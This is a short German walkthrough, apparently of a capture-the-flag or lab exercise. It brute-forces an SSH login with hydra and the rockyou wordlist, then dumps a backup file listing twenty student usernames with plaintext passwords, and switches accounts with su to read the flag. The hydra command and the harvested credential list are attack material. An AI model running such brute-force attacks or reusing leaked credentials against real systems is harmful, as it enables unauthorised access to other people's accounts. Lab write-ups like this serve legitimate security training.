
hydra -l student01337 -P /usr/share/wordlists/rockyou.txt ssh://10.65.9.16
Passwort ist `hector`

unter Backups findet man eine Passwortliste:
```
student00776:bpH5XZCAmvNrGjzm
student00398:TYzPZFqNNOWsoQrx
student00111:MDQCtbYlzlBCW8zz
student00191:omHDh94n5W7v55Y6
student00557:S8blMfBCcbYKpa04
student00924:h58cMEruAt6YS29E
student00024:UnYg0Rj4tVV0y2hA
student00573:LNwbZA9oe7XBU5mS
student00801:fU20bVAjnS1EZHqW
student00949:LmL0hUshxJITk7zm
student00986:z2RjBOlgHlVOtwSY
student00246:lcEzmqO6Rbi9wz1S
student00171:sY0t4hlhcoSPtn0s
student00073:oItotvSGXxZfqj25
student00144:RiVM6K3w1A5cdyxp
student00730:2jKKDYdPJerGKMeB
student00298:YC1iblw0e8ROgUoS
student00683:8jhyqIem240rt7gZ
student00345:iTzDKl1deVECKmni
student00042:qdeZZDuIAEiEnpOP
```

Auf dem System ist außerdem ein Heimatverzeichnis von `student00042`. Mit `su student00042` und dem Passwort kann man den Account wechseln, unter `/home/student00042/webseite/index.html` findet man die Flag.
